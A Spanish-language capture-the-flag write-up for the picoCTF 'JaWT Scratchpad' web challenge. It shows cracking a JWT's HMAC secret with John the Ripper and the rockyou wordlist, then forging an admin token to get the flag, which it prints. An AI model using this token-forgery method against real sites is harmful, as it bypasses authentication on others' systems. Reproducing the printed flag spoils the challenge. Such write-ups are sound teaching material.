## Objetivo
Check the admin scratchpad! `https://jupiter.challenges.picoctf.org/problem/58210/` or http://jupiter.challenges.picoctf.org:58210
## Solución 
```
Abrimos el url
Nos logueamos con nuestro nombre
Nos vamos a nuestro cookie editor y tomamos el token que nos genero al loguearnos.
pegamos ese token en un archivo y lo llamamos has+h
┌──(kali㉿kali)-[~]
└─$ nano hash      
                                                                                  
┌──(kali㉿kali)-[~]
└─$ cat hash       
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZmFiaSJ9.bP_I1j2eCHbZ7v77-ZfNItBd_XTLDZowbJIvAoOHJM0

                                                                                  
┌──(kali㉿kali)-[~]
└─$ ls /usr/share/wordlists
amass      fasttrack.txt  legion      rockyou.txt.gz  wifite.txt
dirb       fern-wifi      metasploit  sqlmap.txt
dirbuster  john.lst       nmap.lst    wfuzz
                                                                                  
┌──(kali㉿kali)-[~]
└─$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz 
[sudo] password for kali: 
                                                                                  
┌──(kali㉿kali)-[~]
└─$ ls /usr/share/wordlists                         
amass  dirbuster      fern-wifi  legion      nmap.lst     sqlmap.txt  wifite.txt
dirb   fasttrack.txt  john.lst   metasploit  rockyou.txt  wfuzz
                                                                                  
┌──(kali㉿kali)-[~]
└─$ head /usr/share/wordlists/rockyou.txt 
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
┌──(kali㉿kali)-[~]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 128/128 SSE2 4x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)     
1g 0:00:00:03 DONE (2023-10-11 18:02) 0.2645g/s 1956Kp/s 1956Kc/s 1956KC/s iloverob4live345..ilovepatri
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
- El usuario se cambia a admin a la hora de generar el token
- Utilizamos ilovepico y lo ponemos como firma para los tokens y nos genera un nuevo token con una firma diferente.
- Lo copiamos, vamos a la aplicacion y modificamos la cookie, la guardamos y recargamos la pagina y nos da la bandera.
picoCTF{jawt_was_just_what_you_thought_44c752f5}
```
## Notas adicionales

JSON JavaScript Object Notation - Notación de Objetos de JavaScript

## Referencias
https://jwt.io/  JSON Web Token
